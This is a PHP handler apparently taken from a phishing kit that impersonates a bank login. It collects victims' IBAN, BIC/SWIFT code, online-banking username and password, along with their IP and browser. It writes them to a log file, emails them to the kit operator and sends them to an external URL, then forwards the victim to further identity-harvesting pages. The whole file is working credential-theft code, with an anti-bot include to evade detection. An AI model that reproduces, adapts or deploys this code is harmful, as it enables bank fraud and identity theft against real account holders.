<?php
error_reporting(0);
ob_start();
session_start();

include '../iban.php';
include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if($_POST['ibansub']){
$string = $_POST["iban"];
    $message = '
 _______________________________
 BIC/SWIFT: '.$_POST["codebank"].'
 IBAN : '.$_POST["iban"].'
 Bank Utilisateur : '.$_POST["bankid"].'
 Bank Mot De Passe : '.$_POST["bankpass"].'
 _______________________________
 IP: '._ip().'
 User Agent: '.$_SERVER['HTTP_USER_AGENT'].'
';}
$Subject="\xf0\x9f\x83\x8f Bank - ".$_SESSION['bank']." \xf0\x9f\x83\x8f"._ip();
$head="From: \xf0\x9f\x95\xb7 ISK 17 \xf0\x9f\x95\xb7  <bank@ayz.com>";
if(isset($string) && !verify_iban($string,$machine_format_only=false)){
     header('location: bank.php?error=true');
}else {
 $fil = fopen('bank_ayz.txt', 'a+');
fwrite($fil, PHP_EOL.'####################'.$message.PHP_EOL.'####################');
$_SESSION['step_five']  = true;
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
if($cni == "oui") {
    header('location:  ../identity.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}else{
        header('location: ../success.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}}}